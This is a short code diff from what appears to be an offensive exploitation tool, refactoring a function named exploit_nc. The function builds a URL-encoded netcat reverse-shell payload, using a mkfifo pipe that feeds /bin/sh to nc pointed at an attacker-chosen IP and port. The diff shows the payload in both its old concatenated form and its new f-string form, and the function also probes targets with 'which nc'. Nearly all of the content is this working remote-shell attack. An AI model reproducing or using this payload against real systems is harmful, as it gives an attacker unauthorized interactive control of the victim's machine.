@@ -1,4 +1,4 @@
-from src.httpreqs.post import POST
+"""NC"""
 from src.httpreqs import request
 from src.configs import config
 from src.utils.encodings import encode
@@ -9,16 +9,13 @@ from src.utils import colors
 
 
 def exploit_nc(exploit, method, ip, port):
+    """Exploit nc"""
     url = exploit["GETVAL"]
     post = exploit["POSTVAL"]
 
     ncTest = "which%20nc"
     ncPayload = (
-        "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+"
-        + ip
-        + "+"
-        + str(port)
-        + "+>/tmp/f"
+        f"rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+{ip}+{port}+>/tmp/f"
     )
 
     print(
